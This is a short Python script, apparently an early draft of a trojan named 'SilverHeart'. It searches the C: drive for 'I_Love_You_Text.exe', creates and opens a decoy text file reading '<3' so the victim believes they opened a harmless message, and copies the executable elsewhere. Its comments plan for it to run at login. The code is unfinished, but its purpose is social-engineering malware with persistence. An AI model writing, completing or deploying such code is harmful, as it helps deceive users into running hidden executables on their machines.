import os
import platform
import subprocess
from shutil import copy

###
# Adding the program to start on log in and set a definitive local for the program is not decided, yet
#
# Reserch needed
###

path = ''
filePath = ''

# Local where the SilverHeart will be stored as a I_Love_You_Text file
dst = ''


# Searchs the whole computer for the file
def finder(name, path):
    for root, dirs, files in os.walk( path ):
        if name in files:
            global pathF, pathB
            pathB = os.path.join( root )
            pathF = os.path.join( root, name )
            return os.path.join( root, name )


finder( 'I_Love_You_Text.exe', 'C:\\' )

src = pathF
pathDecoy = os.path.join( pathB, 'I_Love_You_Text.txt' )

# Crates the decoy file
with open( pathDecoy, 'w' ) as file:
    file.write( '<3' )
    file.close()

# Opens Decoy File when parent script clicked
if platform.system() == 'Windows':  # Windows
    os.startfile( pathDecoy )
elif platform.system() == 'Darwin':  # MacOS
    subprocess.Popen( ['start', pathDecoy] )
else:  # Linux
    subprocess.Popen( ['xdg-open', pathDecoy] )

# Copy file on startup to directory
try:
    copy( src, dst )
    print( 'Done' )
except OSError as E:
    print( 'Exception: ', str( E ) )
